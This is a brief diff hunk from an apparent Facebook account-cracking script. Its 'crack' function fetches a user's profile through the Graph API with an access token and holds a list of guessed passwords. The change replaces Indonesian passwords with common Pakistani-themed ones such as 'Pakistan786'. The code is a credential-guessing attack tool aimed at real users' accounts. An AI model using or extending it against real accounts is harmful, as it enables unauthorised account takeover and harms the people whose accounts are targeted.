@@ -263,7 +263,7 @@ def grp():
 def crack(usr):
     global a
     moe = [
-     'sayang', 'kontol', 'ganteng12345', 'cantik123', 'bangsat', 'indonesia']
+     'Pakistan', '786786', '123786', 'Ali123', 'Pakistan786', 'qwertyuiop']
     uh = requests.get('https://graph.facebook.com/' + usr + '/?access_token=' + tok)
     nya = json.loads(uh.text)
     for i in nya:
